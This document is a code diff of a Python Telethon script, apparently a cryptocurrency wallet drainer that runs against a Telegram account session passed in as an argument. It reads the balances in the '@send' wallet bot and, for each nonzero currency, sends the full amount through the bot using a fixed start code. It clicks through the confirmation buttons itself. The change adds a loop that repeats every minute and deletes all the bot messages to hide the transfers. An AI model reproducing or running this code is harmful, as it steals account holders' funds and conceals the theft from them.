@@ -1,61 +1,72 @@
-from telethon.sync import TelegramClient
 from telethon.tl.functions.messages import StartBotRequest
 import time
 
 client = args[0]
 
-try:client.edit_folder('@send', 1)
-except:...
+while True:
+    
+    torem = []
 
-client.send_message('@send', '/wallet')
+    try:client.edit_folder('@send', 1)
+    except:...
 
-try:client.edit_folder('@send', 1)
-except:...
+    msg=client.send_message('@send', '/wallet')
+    torem.append(msg.id)
 
-time.sleep(1)
+    try:client.edit_folder('@send', 1)
+    except:...
 
-last=client.iter_messages('@send',1)
+    time.sleep(1)
 
-for text in last:
+    last=client.iter_messages('@send',1)
 
-    text = text.message
+    for text in last:
 
-    cryptos = ['USDT','TON','SOL','GRAM','NOT','HMSTR','CATI','MY','DOGS','BTC','DOGE','LTC','ETH','BNB','TRX','USDC']
+        torem.append(text.id)
+        text = text.message
 
-    values = '\n'.join(text.split(': ')).split('\n')
-    res = []
-    for val in values:
-        if val.split(' ')[-1] in cryptos and '≈' not in val:
-            num = val.split(' ')[0]
-            name = val.split(' ')[-1]
+        cryptos = ['USDT','TON','SOL','GRAM','NOT','HMSTR','CATI','MY','DOGS','BTC','DOGE','LTC','ETH','BNB','TRX','USDC']
 
-            print(f'{name} - {num}')
+        values = '\n'.join(text.split(': ')).split('\n')
+        res = []
+        for val in values:
+            if val.split(' ')[-1] in cryptos and '≈' not in val:
+                num = val.split(' ')[0]
+                name = val.split(' ')[-1]
 
-            if float(num)>0:
+                print(f'{name} - {num}')
 
-                client(StartBotRequest('@send', '@send', 'IV0XOLp7c0mn'))
+                if float(num)>0:
 
-                time.sleep(1)
+                    client(StartBotRequest('@send', '@send', 'IV0XOLp7c0mn'))
 
-                last=client.iter_messages('@send',1)
-                for t in last: 
-                    if t.reply_markup:
-                        ii=-1
-                        for row in t.reply_markup.rows:
-                            for button in row.buttons:
-                                ii+=1
-                                dat = button.data.decode()
-                                if dat.replace('choose-currency-', '') == name:
-                                    t.click(ii)
-                                    time.sleep(1)
-                                    client.send_message('@send',num)
-                                    time.sleep(1)
-                                    last=client.iter_messages('@send',1)
-                                    for t in last: 
-                                        if t.reply_markup:
-                                            t.click(0)
-                                            time.sleep(1)
-                                            last=client.iter_messages('@send',1)
-                                            for t in last: 
-                                                if t.reply_markup:
-                                                    t.click(0)
+                    time.sleep(1)
+
+                    last=client.iter_messages('@send',1)
+                    for t in last: 
+                        torem.append(t.id)
+                        if t.reply_markup:
+                            ii=-1
+                            for row in t.reply_markup.rows:
+                                for button in row.buttons:
+                                    ii+=1
+                                    dat = button.data.decode()
+                                    if dat.replace('choose-currency-', '') == name:
+                                        t.click(ii)
+                                        time.sleep(1)
+                                        msg=client.send_message('@send',num)
+                                        torem.append(msg.id)
+                                        time.sleep(1)
+                                        last=client.iter_messages('@send',1)
+                                        for t in last: 
+                                            torem.append(t.id)
+                                            if t.reply_markup:
+                                                t.click(0)
+                                                time.sleep(1)
+                                                last=client.iter_messages('@send',1)
+                                                for t in last: 
+                                                    torem.append(t.id)
+                                                    if t.reply_markup:
+                                                        t.click(0)
+    client.delete_messages('@send', torem)
+    time.sleep(60)
